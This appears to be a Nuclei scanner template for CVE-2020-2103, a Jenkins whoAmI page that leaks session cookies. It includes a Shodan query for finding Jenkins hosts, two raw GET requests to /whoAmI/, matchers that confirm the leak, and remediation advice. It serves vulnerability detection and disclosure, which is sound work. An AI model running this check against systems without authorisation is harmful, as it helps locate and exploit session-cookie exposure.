id: CVE-2020-2103
info:
  name: Diagnostic page exposed session cookies
  author:
  - l0ne1y
  tags:
  - cve
  - cve2020
  - jenkins
  description: |-
    CloudBees Jenkins whoami诊断页面存在信息泄露漏洞
    CloudBees Jenkins（Hudson Labs）是美国CloudBees公司的一套基于Java开发的持续集成工具。该产品主要用于监控持续的软件版本发布/测试项目和一些定时执行的任务。LTS是CloudBeesJenkins的一个长期支持版本。

    CloudBees Jenkins 2.218及之前和LTS 2.204.1及之前版本中的whoAmI诊断页面存在信息泄露漏洞。该漏洞源于网络系统或产品在运行过程中存在配置等错误。未授权的攻击者可利用漏洞获取受影响组件敏感信息。
  reference:
  - https://nvd.nist.gov/vuln/detail/cve-2020-2103
  - https://www.jenkins.io/security/advisory/2020-01-29/#security-1695
  - https://jenkins.io/security/advisory/2020-01-29/#security-1695
  - http://www.openwall.com/lists/oss-security/2020/01/29/1
  severity: medium
  metadata:
    shodan-query: http.favicon.hash:81586312
  classification:
    cve-id:
    - cve-2020-2103
    cwe-id:
    - cwe-200
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 5.4
  remediation: |-
    官方修复方案：
    1.目前厂商已发布升级补丁以修复漏洞，补丁获取链接：
    https://jenkins.io/security/advisory/2020-01-29/
requests:
- matchers:
  - type: status
    status:
    - 200
  - type: word
    condition: and
    part: header
    words:
    - text/html
    - x-jenkins
    case-insensitive: true
  - type: word
    condition: and
    part: body_2
    words:
    - Cookie
    - 'SessionId: null'
  extractors:
  - type: kval
    kval:
    - x_jenkins
  matchers-condition: and
  raw:
  - |
    GET {{BaseURL}}/whoAmI/ HTTP/1.1
    Host: {{Hostname}}
  - |
    GET {{BaseURL}}/whoAmI/ HTTP/1.1
    Host: {{Hostname}}
  cookie-reuse: true
  req-condition: true
